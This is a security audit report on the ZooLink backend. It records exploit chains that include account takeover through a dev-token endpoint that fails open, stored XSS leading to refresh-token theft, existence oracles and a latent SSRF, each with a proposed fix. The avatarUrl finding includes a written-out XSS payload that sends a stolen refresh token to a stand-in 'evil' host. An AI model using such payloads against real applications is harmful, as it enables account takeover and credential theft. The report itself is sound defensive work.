# ZooLink HYPER² Audit — Round 2 · security (appsec authority, forward-compat + exploit-chain lens)

**Date:** 2026-07-02 · **Branch:** `backend` · **HEAD:** `4533e78` (not pushed) · **Method:**
independent re-attack of the named security seams, this time hunting **exploit chains** that
escalate the round-1 MINOR/MAJOR findings, plus a fresh sweep of the abuse/enumeration/SSRF surface
and the new modules (saved-search, content-report, transfer, moderation). Read real code
(controllers + services + guards + CASL + DTOs + crypto), not the round-1 file, then diffed.

Format: `[severity][criterion][NEW|CONFIRMED|REFUTED|SEV-CHG] file:line → exploit-chain → fix`.
Severity ∈ BLOCKER / CRITICAL / MAJOR / MINOR / INFO.

---

## Headline — TWO round-1 findings escalate to CRITICAL via concrete chains

### 1. dev-token fail-open → arbitrary account takeover (MAJOR → **CRITICAL**)

`[CRITICAL][authz][SEV-CHG] auth.controller.ts:62-79 + config/env.validation.ts:8 + listing.service.ts:1045 →`
**exploit-chain (fully wired, single precondition):**
1. `env.validation.ts:8` `NODE_ENV` **defaults to `'development'`**. A prod deploy that forgets to
   set `NODE_ENV=production` boots with `config.isProduction === false`.
2. `/auth/dev-token` (`@Public`) is gated **only** by `if (this.config.isProduction)` (`:66`) → the
   guard evaluates false → the endpoint is **LIVE in production**. It mints a full session for **any
   `userId`** (`:73-78`), no secret, no rate-limit.
3. The victim's user UUID is **free to an anonymous attacker**: `listing.service.ts:1045`
   `toView` projects `sellerId: row.seller_id` on every public ACTIVE listing. `GET /v1/listings` →
   pick any seller's UUID.
4. `POST /auth/dev-token {"userId": "<seller-uuid>"}` → `200` + `TokenPair` → **full account
   takeover** of that seller. Escalation to ADMIN: any operator UUID leaked via `resolvedBy.actorId`
   / audit / a seeded admin id → `dev-token` as them → `AbilityFactory:52` `can('manage','all')` =
   platform-wide compromise.

This is a **fail-OPEN default on a master-key route** — the textbook CRITICAL pattern (fail-safe
defaults violated). Round-1 rated MAJOR; the exploitable chain (public UUID source + zero-secret
mint + arbitrary subject) plus the fail-open direction warrant CRITICAL. Only the prod-misconfig
precondition holds it back from BLOCKER.
**Fix:** gate behind an explicit `ENABLE_DEV_TOKEN` env flag **defaulting false, independent of
NODE_ENV**; additionally drop the `NODE_ENV` `.default('development')` so a prod boot without it
fails fast. (`oauth.registry.ts` shares the `isProduction` gate — same treatment.)

### 2. avatarUrl stored-XSS × refresh-token-in-body → operator ATO (MAJOR+MAJOR → **CRITICAL as a chain**)

`[CRITICAL][xss+token-exfil][SEV-CHG] identity.dto.ts:47,94,125 + auth.controller.ts:33 + auth.dto.ts:6-8 →`
**exploit-chain (latent — fires the moment the FE renders avatar + stores the refresh token):**
1. `avatarUrl` on RegisterPhoneDto/OAuthDto/UpdateProfileDto is validated **only** `@IsString
   @MaxLength(500)` — **no `@IsUrl`** (ADR-0019 T3 explicitly promised `@IsUrl`; not implemented).
   `PATCH /v1/me {"avatarUrl":"\"><img src=x onerror=fetch('//evil/?t='+localStorage.refresh)>"}`
   is accepted and stored raw (identity.service persists verbatim; JSON API does no output-encoding).
2. The payload is served in the user profile, the **seller card**, and the **admin user-role panel**
   (toUserRoleInfo). When a MODERATOR/ADMIN opens that profile in the operator UI, the script runs
   **in the operator's browser**.
3. `auth.controller.ts:33` returns the refresh token **in the JSON body** (`RefreshTokenDto` also
   *accepts* it in the body), so a browser client must keep this long-lived (`JWT_REFRESH_TTL` ~7d)
   credential in JS-reachable storage → the XSS exfiltrates it.
4. Attacker replays the stolen refresh → `/auth/refresh` mints access tokens → **account takeover
   surviving access-token rotation**, escalated to **operator/admin ATO** because the victim who
   rendered the payload was an operator.

Each half is MAJOR alone; **combined they are a CRITICAL XSS→ATO→privilege-escalation chain**.
Latent today (no FE), but both halves are backend contract defects shipping now.
**Fix:** (a) `@IsUrl({require_protocol:true, protocols:['http','https']})` on all three DTOs +
output-encode on render; (b) deliver/accept the refresh token as an `httpOnly + Secure +
SameSite=strict` cookie (keep the body path behind a native-client flag) — contract change, route
to alpha-analyst/architect.

---

## Round-1 findings — re-verified

`[MAJOR][idor][CONFIRMED] animal.service.ts:167-172 → getById does findOrThrow (404 absent) then
assertCan('read', Animal). AbilityFactory default case (:66-80) grants NO unconditional
can('read','Animal') — only can('manage','Animal',{owner_id:uid}). So a non-owner reading an
EXISTING animal → 403; absent → 404 = existence oracle, breaking the codebase's own 404-no-leak
invariant that listing/saved-search/content-report all honour. The inline comment ":167 Read authz
is open to all roles (matrix)" is FALSE. Exploitability LOW (UUIDv4 ids). → on read-authz failure
collapse to 404 NOT_FOUND. This is the forward-compat drift signal (see FC-1).`

`[MAJOR][exposure][CONFIRMED] lib/metrics/metrics.controller.ts:7-10 → GET /metrics @Public
@SkipThrottle → world-readable Prometheus scrape if the port is internet-reachable (business
volumes, route/label cardinality for recon). → bind to an internal interface / ops credential.
Deploy topology isolation = требует ручной проверки (devops); if isolated → INFO.`

`[MAJOR][abuse][CONFIRMED] listing.service.ts:509-524 → reveal limit keyed
contact-reveal:{market}:{viewerId} — per-ACCOUNT only, no per-listing/per-seller cap, no
account-age/verification gate. Sybil reset via a fresh phone-OTP account restores the quota →
scrape every seller's phone. LOW today (channels empty) → MEDIUM once contact_phone populates. →
add per-listing AND per-seller caps + min-account-age/verification gate.`

`[MAJOR][abuse][CONFIRMED] listing.service.ts:128-175 → no per-user listing-creation quota (only
uq_active_listing per animal-type + max 10 photos). Create N animals → N listings → flood +
moderation-queue DoS. → per-user active-listing cap + creation throttle (value → architect).`

`[MAJOR][forward-compat][CONFIRMED] animal.service.ts:167 vs listing.service.ts:199 vs
content-report.service.ts:128 vs saved-search.service.ts:104 → the loadRow→authz→no-leak logic is
copy-pasted per module and HAS DIVERGED: animal chose 403, the other three chose 404. Every new
ecosystem object (ServiceOffering/booking/order/verification-doc, ADR-0014/0016) re-derives no-leak
by hand and one WILL get it wrong (animal already did). → extract a shared object-authz base
(loadOrThrow + assertOwnerOrOperator + 404-collapse) with 404-no-leak as the DEFAULT, before the
object count multiplies.`

`[MAJOR][forward-compat][CONFIRMED] lib/auth/ability.factory.ts:46-83 → an AGENT principal is
scoped ONLY by its ROLE; an AGENT with role=ADMIN inherits can('manage','all'). ADR-0016's AGENT
provider tier needs least-privilege + human-override from SCOPED service_credentials, not a reused
human role grant. → reserve an agent-scope dimension in AbilityFactory now (form) so AI providers
cannot be over-privileged when the gate opens.`

`[MINOR][toctou][CONFIRMED — does NOT escalate] refresh-token.service.ts:60-92 → rotate() reads the
row (revoked_at==null), then $transaction updates BY ID unconditionally + creates the successor. Two
concurrent requests with the SAME token both pass the null-check (READ COMMITTED) → each mint a new
family, neither trips reuse-detection. I tried to escalate: it CANNOT grant new access (the attacker
must already possess the token) — it only lets a thief+victim race go UNDETECTED, weakening a
detection control. Stays MINOR. → make it atomic: updateMany({where:{id,revoked_at:null}}) and treat
count!==1 as reuse→revokeFamily (the same single-winner guard already used in markSold/resolve).`

`[MINOR][hardening][CONFIRMED — does NOT escalate] token.service.ts:22-23 + auth.module.ts:31-37 →
jwt.verify has no {algorithms:['HS256']} and JwtModule sets no verifyOptions. Attempted alg-confusion
escalation: mitigated — only a symmetric secret is configured (no public key to abuse for RS256→HS256),
and jsonwebtoken rejects alg:none for a non-empty secret. Stays MINOR (defense-in-depth). → pin
algorithms:['HS256'] on verify + verifyOptions in the module.`

`[MAJOR][token-exfil][CONFIRMED] auth.controller.ts:33 + auth.dto.ts → refresh token accepted/returned
in the JSON body → client must hold a ~7d credential in JS-reachable storage → any XSS = ATO (see the
CRITICAL chain above). → httpOnly+Secure+SameSite cookie; contract change → architect.`

`[INFO][pii][CONFIRMED] ADR-0019 crypto form is real: email = AES-256-GCM + HMAC email_bidx
(identity.service:96); contact_phone column ciphertext, reveal decrypts (listing.service:471); erase
clears both. Residual OD-1: there is still NO write path that SETS contact_phone, so the encrypt-on-
write half is latent — when /me contact-set lands it MUST route through crypto.encrypt. full_name
plaintext = ADR-0019 Tier-T2 accepted risk (storage-level enc at rest, devops). Launch-gate checks.`

---

## NEW findings (round-2)

`[MAJOR][abuse][NEW] listing.service.ts:905-906 + listing/dto:215 → a listing photo is stored as
dto.url validated only @IsUrl({require_tld:false}). @IsUrl blocks javascript:/data: (good), but it
allows ANY external OR internal HTTP host, pointing the stored image at a SELLER-CONTROLLED origin.
Two impacts: (1) MODERATION-BYPASS / content-integrity break — pre-moderation is ZooLink's core
safety model, but the moderator approves an image the seller can SWAP at any time post-approval (the
DB stores only the URL, not the bytes); after approval the seller changes the remote content →
published listing shows prohibited/illegal imagery the moderator never saw. Defeats image
pre-moderation entirely. (2) LATENT SSRF — require_tld:false permits http://169.254.169.254/… ,
http://localhost:PORT, internal hostnames; the day any server-side fetch lands (thumbnailing,
image-safety scanning, link-preview) it fetches attacker-chosen internal URLs. Real-world today:
MEDIUM (moderation-swap works now; no server fetch yet). → photos MUST be uploaded to OUR S3/MinIO
(ADR-0008 storage provider) and stored as immutable own-bucket object keys; reject any URL whose host
is not our storage host (host-allowlist), never accept an arbitrary remote URL as durable media.`

`[MINOR][abuse][NEW] transfer.service.ts:109-113 → initiate() looks up dto.toUserId /
dto.toOrganizationId and throws a DISTINCT 404 ("Recipient user not found" / "Recipient organization
not found") when absent vs proceeding when present → a user-existence / org-existence enumeration
ORACLE for any actor who owns one animal. Exploitability LOW (UUIDv4 recipient ids unguessable; the
"found" path also fires a real transfer + notification = noisy). Mainly useful to VALIDATE a specific
UUID already obtained (e.g. a seller_id from a public listing). → 404-no-leak is impossible here (the
recipient legitimately must exist), but do not distinguish user-vs-org in the message and rate-limit
initiate; accept as low residual otherwise.`

`[MINOR][abuse][NEW] content-report.service.ts:197-208 → assertTargetExists() returns 404 "The
reported entity does not exist" for a missing LISTING/ANIMAL/USER vs proceeding when present → same
existence-oracle shape as transfer. LOW (UUID ids; create side-effects). → same treatment: generic
message, rely on UUID unguessability; low residual.`

`[INFO][positive][NEW] saved-search.service.ts:63-109, content-report.service.ts:96-134,
transfer.service.ts:473-504 → I attacked the four newest modules for IDOR and the object-level authz
HOLDS: saved-search owner is always actor.userId, list is absolute user_id=actor, delete is guarded
deleteMany→404-no-leak; content-report getById collapses non-owner→404, list AND-intersects
reporter_id, resolve is a guarded single-winner updateMany; transfer assertCanRespond/assertCanView
gate by party membership, accept path re-verifies recipient. Parameterized SQL throughout (Prisma;
listing $queryRaw uses ${…}::uuid bound params). No new IDOR/injection break found in these.`

---

## Diff vs AUDIT2/security.md

- **CONFIRMED (12):** animal-403-oracle, avatarUrl-no-IsUrl, refresh-in-body, rotate-TOCTOU,
  JWT-algs-pin, /metrics-Public, dev-token-fail-open, contact-reveal-Sybil, listing-flood-quota,
  no-leak-copy-paste-drift (FC-1), AGENT-not-least-privilege (FC-2), PII contact_phone/full_name.
- **SEV-CHG (2 → CRITICAL):** dev-token fail-open MAJOR→CRITICAL (public-UUID + zero-secret mint
  chain); avatarUrl-XSS × refresh-in-body MAJOR+MAJOR→CRITICAL (XSS→refresh-exfil→operator-ATO chain).
- **NEW (4):** photo-URL arbitrary-host moderation-bypass + latent SSRF (MAJOR); transfer recipient
  enumeration oracle (MINOR); content-report target enumeration oracle (MINOR); new-module IDOR
  posture holds (INFO positive).
- **REFUTED (0).**

## Gate stance
NO-GO on any internet-reachable deploy until the **dev-token fail-open** is fixed (fail-closed flag)
and **/metrics** is network-isolated — these two are the pre-outward must-fix. avatarUrl-@IsUrl and
photo-host-allowlist are must-fix before the FE/moderation surfaces go live. The rotate-TOCTOU +
JWT-algs-pin are low-risk defense-in-depth. The shared-object-authz base (FC-1) and AGENT-scope
dimension (FC-2) are the structural fixes to land BEFORE the ecosystem object count multiplies —
route to architect (ADR).

*Scope note:* /metrics deploy isolation, FE avatar render/encoding, and server-side image fetch are
`требует ручной проверки` — I audited backend code + DTOs + guards + schema only. No product code
modified; this file is my sole output.
